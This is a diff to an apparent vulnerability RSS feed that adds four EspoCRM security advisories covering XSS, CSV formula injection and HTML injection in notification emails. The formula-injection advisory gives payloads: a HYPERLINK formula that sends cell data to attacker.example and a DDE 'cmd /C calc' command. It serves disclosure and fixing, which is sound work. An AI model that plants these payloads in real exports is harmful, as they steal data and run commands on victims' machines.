@@ -7,7 +7,187 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Tue, 14 Jul 2026 06:07:24 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 15 Jul 2026 06:10:50 +0000</lastBuildDate>
+    <item>
+      <title>[LOW] espocrm/espocrm – Stored XSS in wysiwyg template fields if CSP is disabled</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-x5p5-8mxj-9wv6</link>
+      <description>### Summary&#13;
+&#13;
+EspoCRM's client-side HTML sanitizer (moderateSanitizeHtml()) can be bypassed using crafted HTML, allowing users with Email Template or PDF Template edit permissions to store malicious JavaScript. When another user opens the template in edit mode, the payload executes. If Content Security Policy is disabled (clientCspDisabled = true), this leads to stored XSS and can result in full session hijacking.&#13;
+&#13;
+Note that by default CSP is enabled, making this vulnerability much less likely to be exploited. &#13;
+</description>
+      <guid isPermaLink="false">GHSA-x5p5-8mxj-9wv6</guid>
+      <pubDate>Tue, 14 Jul 2026 09:09:36 +0000</pubDate>
+    </item>
+    <item>
+      <title>[LOW] espocrm/espocrm – CSV/Formula Injection (CWE-1236) sanitizer bypass via leading whitespace/control characters in export</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-xrwp-2gph-985x</link>
+      <description>## Vulnerability Details&#13;
+&#13;
+**Files**:&#13;
+- `application/Espo/Tools/Export/Format/Csv/Processor.php` (`sanitizeCellValue()`, ~line 107-122)&#13;
+- `application/Espo/Tools/Export/Format/Xlsx/OpenSpoutProcessor.php` (`sanitizeCellValue()`, ~line 279-294)&#13;
+- `application/Espo/Tools/Export/Format/Xlsx/PhpSpreadsheetProcessor.php` (`sanitizeCellValue()`, ~line 622-641)&#13;
+&#13;
+**CWE**: CWE-1236 — Improper Neutralization of Formula Elements in a CSV File&#13;
+**Severity**: Medium&#13;
+**CVSS**: 5.4 — CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N&#13;
+&#13;
+### Root Cause&#13;
+&#13;
+EspoCRM already implements a CSV/Formula Injection mitigation: if an exported field's value&#13;
+begins with `=`, `+`, `-`, or `@`, the export processors prefix the value with a single quote&#13;
+`'` so spreadsheet programs (Excel, LibreOffice, Google Sheets) treat the cell as text rather&#13;
+than as a formula.&#13;
+&#13;
+However, all three `sanitizeCellValue()` implementations only inspect `$value[0]` — the&#13;
+literal first byte of the string:&#13;
+&#13;
+```php&#13;
+private function sanitizeCellValue(string $value): string&#13;
+{&#13;
+    if ($value === '') {&#13;
+        return $value;&#13;
+    }&#13;
+&#13;
+    if (is_numeric($value)) {&#13;
+        return $value;&#13;
+    }&#13;
+&#13;
+    if (in_array($value[0], ['+', '-', '@', '='])) {&#13;
+        return "'" . $value;&#13;
+    }&#13;
+&#13;
+    return $value;&#13;
+}&#13;
+```&#13;
+&#13;
+Microsoft Excel (and other spreadsheet apps) will still evaluate a cell as a formula even&#13;
+when the formula-trigger character (`=`, `+`, `-`, `@`) is preceded by whitespace or control&#13;
+characters such as a tab (`\t`, 0x09) or carriage return (`\r`, 0x0D) — Excel trims leading&#13;
+whitespace/control characters before deciding whether the cell content is a formula.&#13;
+&#13;
+A value like `"\t=1+1+cmd|\"/C calc\"!A0"` has `$value[0] === "\t"`, which is **not** in&#13;
+`['+','-','@','=']`, so the sanitizer returns the value unchanged. The raw, un-prefixed&#13;
+payload is written to the exported CSV/XLSX file and delivered to the user.&#13;
+&#13;
+### Attack Scenario&#13;
+&#13;
+1. A low-privilege user (e.g. a Sales rep or Portal user, depending on entity-level&#13;
+   create/edit ACL) sets a free-text field they control — e.g. their own Contact&#13;
+   "Description", a Lead field, a custom text field, or a Note body — to a value beginning&#13;
+   with a tab character followed by a formula-injection payload, e.g.:&#13;
+   `\t=HYPERLINK("http://attacker.example/leak?d="&amp;A1&amp;A2,"Click")`&#13;
+2. An admin/manager later exports the corresponding list (Contacts, Leads, Notes, etc.) to&#13;
+   CSV or XLSX via the standard Export feature (`POST /Export`).&#13;
+3. The exported file contains the attacker-controlled cell starting with `\t=...`,&#13;
+   unescaped (no leading `'`).&#13;
+4. The admin opens the file in Excel/LibreOffice. The leading tab is stripped/ignored by the&#13;
+   spreadsheet's formula parser, the cell is evaluated as a formula, and the payload&#13;
+   executes (e.g. external link / data exfiltration via `HYPERLINK`/`WEBSERVICE`, or — on&#13;
+   legacy Excel configurations with DDE enabled — command execution).&#13;
+&#13;
+### Impact&#13;
+&#13;
+- Client-side formula execution in the spreadsheet application of whoever opens the&#13;
+  exported CSV/XLSX file (typically an admin/manager with access to Export).&#13;
+- Potential data exfiltration via formulas referencing other cells / making outbound HTTP&#13;
+  requests (`HYPERLINK`, `WEBSERVICE`).&#13;
+- On legacy Excel configurations, potential command execution via DDE.&#13;
+- Requires authenticated low-privilege attacker plus victim user interaction (opening the&#13;
+  exported file and accepting any Excel security prompts), so impact is bounded but real —&#13;
+  this is the same vulnerability class EspoCRM has already chosen to mitigate; the existing&#13;
+  mitigation is simply incomplete.&#13;
+&#13;
+### Vulnerable Code&#13;
+&#13;
+```php&#13;
+private function sanitizeCellValue(string $value): string&#13;
+{&#13;
+    if ($value === '') {&#13;
+        return $value;&#13;
+    }&#13;
+&#13;
+    if (is_numeric($value)) {&#13;
+        return $value;&#13;
+    }&#13;
+&#13;
+    if (in_array($value[0], ['+', '-', '@', '='])) {&#13;
+        return "'" . $value;&#13;
+    }&#13;
+&#13;
+    return $value;&#13;
+}&#13;
+```&#13;
+(identical pattern duplicated in all three export processors; the PhpSpreadsheetProcessor&#13;
+variant takes `mixed $value` with an additional `is_string()` guard at the top)&#13;
+&#13;
+### Recommended Fix&#13;
+&#13;
+Trim leading whitespace/control characters before checking the first character, and prefix&#13;
+the *original* (untrimmed) value with `'` if the trimmed value starts with a dangerous&#13;
+character:&#13;
+&#13;
+```php&#13;
+private function sanitizeCellValue(string $value): string&#13;
+{&#13;
+    if ($value === '') {&#13;
+        return $value;&#13;
+    }&#13;
+&#13;
+    if (is_numeric($value)) {&#13;
+        return $value;&#13;
+    }&#13;
+&#13;
+    $trimmed = ltrim($value, " \t\r\n\v\0");&#13;
+&#13;
+    if ($trimmed !== '' &amp;&amp; in_array($trimmed[0], ['+', '-', '@', '='])) {&#13;
+        return "'" . $value;&#13;
+    }&#13;
+&#13;
+    return $value;&#13;
+}&#13;
+```&#13;
+&#13;
+### Verification&#13;
+&#13;
+Dynamically confirmed on v9.3.8 in a Docker lab (`espocrm/espocrm:9.3.8` + `mariadb:11`):&#13;
+- Created a Lead with `description = "\t=1+1+cmd|\"/C calc\"!A0"`.&#13;
+- Exported via `POST /api/v1/Export` with `format=csv` and `format=xlsx`.&#13;
+- CSV output (raw bytes, `cat -A`):&#13;
+  `TestLead,"^I=1+1+cmd|""/C calc""!A0"$` — no leading `'`, cell starts with TAB then `=`.&#13;
+- XLSX `xl/sharedStrings.xml`:&#13;
+  `&lt;si&gt;&lt;t xml:space="preserve"&gt;\t=1+1+cmd|&amp;quot;/C calc&amp;quot;!A0&lt;/t&gt;&lt;/si&gt;` — same bypass.&#13;
+- Control case `description = "=1+1"` was correctly prefixed to `'=1+1` in both formats,&#13;
+  confirming the existing mitigation logic is reachable but bypassable via a leading&#13;
+  whitespace/control character.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-xrwp-2gph-985x</guid>
+      <pubDate>Tue, 14 Jul 2026 09:09:22 +0000</pubDate>
+    </item>
+    <item>
+      <title>[LOW] espocrm/espocrm – Persistent XSS via CSP nonce injection in applicationName setting by admin user</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-f34h-xxmv-j9xp</link>
+      <description>## Summary&#13;
+&#13;
+An administrator can inject a JavaScript file into the application page, potentially causing data leakage, including unsaved user input.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-f34h-xxmv-j9xp</guid>
+      <pubDate>Tue, 14 Jul 2026 09:09:08 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – Pre-authentication stored HTML injection in stream notification emails about email received</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-3rh4-9hcq-g79m</link>
+      <description>### Summary&#13;
+&#13;
+An unauthenticated, remote attacker can inject arbitrary HTML (and, depending on therecipient's mail client, executable JavaScript) into the **"Email Received" streamnotification emails** that EspoCRM sends to internal users. The attacker only needs to send anormal email to an address that EspoCRM monitors (e.g. a group/IMAP account configured foremail‑to‑Case). The plain‑text body of that email is stored verbatim and later rendered **unescaped** into the HTML notification delivered to every user following the related record.&#13;
+&#13;
+This is the same vulnerability class that EspoCRM already fixed for the *Post* and *Mention*notifications (commit `27b1ce882b`, which switched those paths to`Markdown::transform()` with inline‑HTML stripping). That fix did **not** cover the "Email Received" notification path, which still emits the attacker‑controlled value raw.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-3rh4-9hcq-g79m</guid>
+      <pubDate>Tue, 14 Jul 2026 09:08:42 +0000</pubDate>
+    </item>
     <item>
       <title>[HIGH] espocrm/espocrm – Authenticated blind SQL injection via streamAttachments where-clause complex expression</title>
       <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-qgm7-fc9g-fj75</link>
